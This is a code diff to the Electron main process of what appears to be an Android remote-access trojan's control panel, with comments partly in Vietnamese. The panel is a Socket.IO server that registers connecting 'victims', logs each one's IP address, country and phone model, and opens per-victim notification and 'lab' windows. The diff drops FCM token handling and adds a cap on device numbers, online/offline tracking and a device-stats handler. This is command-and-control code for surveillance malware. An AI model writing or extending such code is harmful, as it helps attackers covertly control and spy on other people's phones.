@@ -148,26 +148,34 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
     if (geo)
       country = geo.country.toLowerCase();
 
-    // Lấy FCM token từ query
-    var fcmToken = query.token || null;
-
     // Lấy ghi chú từ DeviceManager nếu thiết bị đã tồn tại
     var existingDevice = deviceManager.getDevice(index);
     var note = existingDevice ? existingDevice.note : '';
 
-    // Add the victim to victimList với FCM token và ghi chú
-    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, index, fcmToken, note);
+    // Kiểm tra giới hạn thiết bị
+    if (!deviceManager.canAddDevice() && !existingDevice) {
+      console.log(`[x] Maximum device limit reached (${deviceManager.maxDevices}). Cannot accept new device: ${index}`);
+      socket.disconnect();
+      return;
+    }
+
+    // Add the victim to victimList với deviceId và ghi chú
+    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, index, note);
 
     // Lưu thông tin thiết bị vào DeviceManager
-    deviceManager.addDevice(index, {
+    const deviceAdded = deviceManager.addDevice(index, {
       ip: ip,
       port: address.remotePort,
       country: country,
       manf: query.manf,
       model: query.model,
       release: query.release,
-      fcmToken: fcmToken
+      isOnline: true
     });
+
+    if (!deviceAdded) {
+      console.log(`[x] Failed to add device ${index} to database`);
+    }
 
     //------------------------Notification SCREEN INIT------------------------------------
     // create the Notification window
@@ -205,6 +213,9 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
     socket.on('disconnect', function () {
       // Decrease the socket count on a disconnect
       victimsList.rmVictim(index);
+
+      // Cập nhật trạng thái offline cho thiết bị
+      deviceManager.updateDeviceStatus(index, false);
 
       //notify renderer proccess (AppCtrl) about the disconnected Victim
       win.webContents.send('SocketIO:RemoveVictim', index);
@@ -333,28 +344,26 @@ ipcMain.on('openLabWindow', function (e, page, index) {
 });
 
 // IPC handlers for device notes
-ipcMain.on('updateDeviceNote', function (event, deviceKey, note, fcmToken) {
+ipcMain.on('updateDeviceNote', function (event, deviceId, note) {
   try {
-    const key = fcmToken || deviceKey;
-    const success = deviceManager.updateDeviceNote(key, note);
+    const success = deviceManager.updateDeviceNote(deviceId, note);
     if (success) {
-      victimsList.updateVictimNote(key, note);
-      event.reply('updateDeviceNoteResponse', { success: true, message: 'Note updated successfully', key, fcmToken });
+      victimsList.updateVictimNote(deviceId, note);
+      event.reply('updateDeviceNoteResponse', { success: true, message: 'Note updated successfully', deviceId });
     } else {
-      event.reply('updateDeviceNoteResponse', { success: false, message: 'Device not found', key, fcmToken });
+      event.reply('updateDeviceNoteResponse', { success: false, message: 'Device not found', deviceId });
     }
   } catch (error) {
-    event.reply('updateDeviceNoteResponse', { success: false, message: 'Error updating note: ' + error.message, key: deviceKey, fcmToken });
+    event.reply('updateDeviceNoteResponse', { success: false, message: 'Error updating note: ' + error.message, deviceId });
   }
 });
 
-ipcMain.on('getDeviceNote', function (event, deviceKey, fcmToken) {
+ipcMain.on('getDeviceNote', function (event, deviceId) {
   try {
-    const key = fcmToken || deviceKey;
-    const note = deviceManager.getDeviceNote(key);
-    event.reply('getDeviceNoteResponse', { success: true, note: note, key, fcmToken });
+    const note = deviceManager.getDeviceNote(deviceId);
+    event.reply('getDeviceNoteResponse', { success: true, note: note, deviceId });
   } catch (error) {
-    event.reply('getDeviceNoteResponse', { success: false, message: 'Error getting note: ' + error.message, key: deviceKey, fcmToken });
+    event.reply('getDeviceNoteResponse', { success: false, message: 'Error getting note: ' + error.message, deviceId });
   }
 });
 
@@ -364,6 +373,15 @@ ipcMain.on('getAllDevices', function (event) {
     event.reply('getAllDevicesResponse', { success: true, devices: devices });
   } catch (error) {
     event.reply('getAllDevicesResponse', { success: false, message: 'Error getting devices: ' + error.message });
+  }
+});
+
+ipcMain.on('getDeviceStats', function (event) {
+  try {
+    const stats = deviceManager.getDeviceStats();
+    event.reply('getDeviceStatsResponse', { success: true, stats: stats });
+  } catch (error) {
+    event.reply('getDeviceStatsResponse', { success: false, message: 'Error getting device stats: ' + error.message });
   }
 });
 
